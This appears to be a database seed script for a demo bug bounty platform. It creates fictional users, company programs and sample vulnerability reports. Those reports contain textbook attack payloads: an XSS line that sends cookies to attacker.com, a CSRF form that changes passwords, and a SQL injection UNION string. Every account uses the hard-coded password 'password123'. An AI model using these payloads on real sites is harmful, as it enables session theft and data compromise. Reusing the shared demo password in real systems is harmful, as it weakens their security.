import { PrismaClient } from "@prisma/client";
import { PrismaLibSql } from "@prisma/adapter-libsql";
import bcrypt from "bcryptjs";
import path from "path";

const dbUrl = process.env.DATABASE_URL || `file:${path.join(process.cwd(), "dev.db")}`;
const adapter = new PrismaLibSql({ url: dbUrl });
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const prisma = new PrismaClient({ adapter } as any);

async function main() {
  console.log("Seeding database...");

  // Create researcher users
  const researchers = await Promise.all([
    prisma.user.upsert({
      where: { email: "alice@researcher.com" },
      update: {},
      create: {
        email: "alice@researcher.com",
        username: "alice_sec",
        displayName: "Alice Chen",
        passwordHash: await bcrypt.hash("password123", 12),
        role: "researcher",
        reputation: 4200,
        bio: "Security researcher specializing in web app vulnerabilities and bug bounties.",
      },
    }),
    prisma.user.upsert({
      where: { email: "bob@hacker.io" },
      update: {},
      create: {
        email: "bob@hacker.io",
        username: "b0b_0ffensive",
        displayName: "Bob Martinez",
        passwordHash: await bcrypt.hash("password123", 12),
        role: "researcher",
        reputation: 2800,
        bio: "Pentester and bug bounty hunter. Top 10 on multiple platforms.",
      },
    }),
    prisma.user.upsert({
      where: { email: "carol@security.dev" },
      update: {},
      create: {
        email: "carol@security.dev",
        username: "carol_infosec",
        displayName: "Carol Kim",
        passwordHash: await bcrypt.hash("password123", 12),
        role: "researcher",
        reputation: 1500,
      },
    }),
  ]);

  console.log(`Created ${researchers.length} researchers`);

  // Create company users
  const acmeUser = await prisma.user.upsert({
    where: { email: "security@acmecorp.com" },
    update: {},
    create: {
      email: "security@acmecorp.com",
      username: "acmecorp",
      displayName: "Acme Corp",
      passwordHash: await bcrypt.hash("password123", 12),
      role: "company",
    },
  });

  const techUser = await prisma.user.upsert({
    where: { email: "bugs@techgiant.io" },
    update: {},
    create: {
      email: "bugs@techgiant.io",
      username: "techgiant",
      displayName: "TechGiant Inc",
      passwordHash: await bcrypt.hash("password123", 12),
      role: "company",
    },
  });

  const cryptoUser = await prisma.user.upsert({
    where: { email: "security@cryptovault.fi" },
    update: {},
    create: {
      email: "security@cryptovault.fi",
      username: "cryptovault",
      displayName: "CryptoVault Finance",
      passwordHash: await bcrypt.hash("password123", 12),
      role: "company",
    },
  });

  console.log("Created company users");

  // Create companies
  const acme = await prisma.company.upsert({
    where: { userId: acmeUser.id },
    update: {},
    create: {
      userId: acmeUser.id,
      name: "Acme Corp",
      website: "https://acmecorp.example.com",
      description:
        "Acme Corp is a leading SaaS provider with over 10 million users worldwide.",
      verified: true,
    },
  });

  const techGiant = await prisma.company.upsert({
    where: { userId: techUser.id },
    update: {},
    create: {
      userId: techUser.id,
      name: "TechGiant Inc",
      website: "https://techgiant.example.io",
      description:
        "TechGiant builds developer tools trusted by 2 million engineers.",
      verified: true,
    },
  });

  const cryptoVault = await prisma.company.upsert({
    where: { userId: cryptoUser.id },
    update: {},
    create: {
      userId: cryptoUser.id,
      name: "CryptoVault Finance",
      website: "https://cryptovault.example.fi",
      description:
        "CryptoVault is a regulated digital asset exchange with $5B+ in daily volume.",
      verified: false,
    },
  });

  console.log("Created companies");

  // Create programs
  const acmeProgram = await prisma.program.upsert({
    where: { slug: "acmecorp-bug-bounty" },
    update: {},
    create: {
      companyId: acme.id,
      name: "Acme Corp Bug Bounty",
      slug: "acmecorp-bug-bounty",
      description:
        "Help us keep Acme Corp secure! We welcome reports on our web application, APIs, and mobile apps. We take security seriously and respond to all valid reports within 5 business days.",
      scope: JSON.stringify([
        "*.acmecorp.example.com",
        "api.acmecorp.example.com",
        "app.acmecorp.example.com",
        "https://mobile-api.acmecorp.example.com",
      ]),
      outOfScope: JSON.stringify([
        "blog.acmecorp.example.com",
        "status.acmecorp.example.com",
        "Third-party services (Stripe, Sendgrid, etc.)",
        "Physical security attacks",
        "Social engineering",
      ]),
      minBounty: 100,
      maxBounty: 15000,
      totalPaid: 47500,
      responseTime: 5,
      status: "active",
    },
  });

  const techProgram = await prisma.program.upsert({
    where: { slug: "techgiant-vdp" },
    update: {},
    create: {
      companyId: techGiant.id,
      name: "TechGiant Security Program",
      slug: "techgiant-vdp",
      description:
        "TechGiant's bug bounty covers our core platform, developer APIs, and GitHub integrations. We reward researchers who help us protect our developer community.",
      scope: JSON.stringify([
        "*.techgiant.example.io",
        "api.techgiant.example.io",
        "dashboard.techgiant.example.io",
        "github.com/techgiant/* (source code review)",
      ]),
      outOfScope: JSON.stringify([
        "Denial of service attacks",
        "Spam or social engineering",
        "Issues requiring physical access",
        "Rate limiting on public endpoints",
      ]),
      minBounty: 250,
      maxBounty: 25000,
      totalPaid: 132000,
      responseTime: 3,
      status: "active",
    },
  });

  const cryptoProgram = await prisma.program.upsert({
    where: { slug: "cryptovault-security" },
    update: {},
    create: {
      companyId: cryptoVault.id,
      name: "CryptoVault Security Bounty",
      slug: "cryptovault-security",
      description:
        "As a financial platform, security is our top priority. We offer some of the highest bounties in the industry for critical vulnerabilities affecting our trading engine, wallets, and user accounts.",
      scope: JSON.stringify([
        "app.cryptovault.example.fi",
        "api.cryptovault.example.fi",
        "trading.cryptovault.example.fi",
        "Android app (com.cryptovault)",
        "iOS app (com.cryptovault.mobile)",
      ]),
      outOfScope: JSON.stringify([
        "Theoretical attacks without proof of concept",
        "Issues affecting unsupported browsers",
        "Self-XSS",
        "Clickjacking on pages without sensitive actions",
      ]),
      minBounty: 500,
      maxBounty: 50000,
      totalPaid: 89000,
      responseTime: 7,
      status: "active",
    },
  });

  console.log("Created programs");

  // Create sample reports
  const report1 = await prisma.report.create({
    data: {
      programId: acmeProgram.id,
      reporterId: researchers[0].id,
      title: "Stored XSS in user profile bio field allows session hijacking",
      description:
        "The user profile bio field does not properly sanitize HTML input, allowing an attacker to inject malicious JavaScript that executes in the context of other users viewing the profile.",
      impact:
        "An attacker can steal session cookies from any user who views the compromised profile, leading to account takeover. Given that Acme has 10M+ users, the impact is widespread.",
      stepsToReproduce: `1. Log in to your Acme Corp account
2. Navigate to Profile Settings at /settings/profile
3. In the Bio field, enter the following payload:
   <img src=x onerror="document.location='https://attacker.com/steal?c='+document.cookie">
4. Save the profile
5. Have another user (or use an incognito window) visit your profile at /users/{username}
6. Observe that their cookies are sent to the attacker's server`,
      severity: "high",
      status: "resolved",
      bountyAmount: 2500,
    },
  });

  await prisma.payment.create({
    data: {
      reportId: report1.id,
      userId: researchers[0].id,
      amount: 2500,
      status: "paid",
      paidAt: new Date(),
    },
  });

  const report2 = await prisma.report.create({
    data: {
      programId: techProgram.id,
      reporterId: researchers[1].id,
      title: "IDOR in /api/v2/projects/{id} allows unauthorized project access",
      description:
        "The project detail API endpoint does not properly verify that the requesting user has access to the requested project. By iterating project IDs, an attacker can access any project including private ones.",
      impact:
        "Complete exposure of all private projects, source code, secrets, and configuration files for all TechGiant users. This could expose API keys, database credentials, and proprietary code.",
      stepsToReproduce: `1. Create two accounts: victim@test.com and attacker@test.com
2. Log in as victim and create a private project. Note the project ID (e.g., proj_abc123)
3. Log in as attacker
4. Make a GET request to /api/v2/projects/proj_abc123
5. Observe that the attacker receives full project details without authorization`,
      severity: "critical",
      status: "accepted",
      bountyAmount: 8500,
      cvssScore: 9.1,
    },
  });

  const report3 = await prisma.report.create({
    data: {
      programId: acmeProgram.id,
      reporterId: researchers[2].id,
      title: "Missing CSRF protection on password change endpoint",
      description:
        "The password change endpoint at /api/account/password does not validate CSRF tokens, allowing an attacker to trick a logged-in user into changing their password.",
      impact:
        "Account takeover by changing the victim's password via a malicious website visited by the victim while logged into Acme Corp.",
      stepsToReproduce: `1. Host the following HTML on an attacker-controlled domain:
   <form method="POST" action="https://app.acmecorp.example.com/api/account/password">
     <input name="new_password" value="hacked123">
   </form>
   <script>document.forms[0].submit()</script>
2. Trick a logged-in Acme user into visiting the malicious page
3. The user's password will be changed to "hacked123"`,
      severity: "medium",
      status: "triaged",
    },
  });

  const report4 = await prisma.report.create({
    data: {
      programId: cryptoProgram.id,
      reporterId: researchers[0].id,
      title: "SQL Injection in trade history search endpoint",
      description:
        "The trade history search endpoint is vulnerable to SQL injection via the 'symbol' parameter. This allows an attacker to dump the entire database including user balances and private keys.",
      impact:
        "Complete database compromise, exposure of all user balances, transaction history, and potentially private keys stored in the database. This could lead to complete loss of funds for all users.",
      stepsToReproduce: `1. Authenticate to the platform
2. Go to Trade History
3. In the search field, enter: BTC' UNION SELECT username, password, NULL FROM users--
4. Observe that user credentials are returned in the response`,
      severity: "critical",
      status: "new",
      cvssScore: 9.8,
    },
  });

  // Add some comments
  await prisma.comment.createMany({
    data: [
      {
        reportId: report1.id,
        userId: researchers[0].id,
        content:
          "I have confirmed this affects all profile pages. Tested on latest Chrome and Firefox.",
        isInternal: false,
      },
      {
        reportId: report1.id,
        userId: acmeUser.id,
        content:
          "Thanks for the detailed report! We've confirmed the vulnerability. Working on a patch now.",
        isInternal: false,
      },
      {
        reportId: report1.id,
        userId: acmeUser.id,
        content: "Patch deployed to production. Awarding $2,500 bounty.",
        isInternal: false,
      },
      {
        reportId: report2.id,
        userId: researchers[1].id,
        content:
          "I can also confirm this works for team projects. The issue seems to be in the authorization middleware.",
        isInternal: false,
      },
      {
        reportId: report2.id,
        userId: techUser.id,
        content:
          "Confirmed as critical. We're expediting the fix. ETA 48 hours.",
        isInternal: false,
      },
    ],
  });

  console.log("Created sample reports and comments");
  console.log("\n✅ Seed complete!");
  console.log("\nDemo accounts:");
  console.log("  Researcher: alice@researcher.com / password123");
  console.log("  Researcher: bob@hacker.io / password123");
  console.log("  Company:    security@acmecorp.com / password123");
  console.log("  Company:    bugs@techgiant.io / password123");
  console.log("  Company:    security@cryptovault.fi / password123");
}

main()
  .catch(console.error)
  .finally(() => prisma.$disconnect());
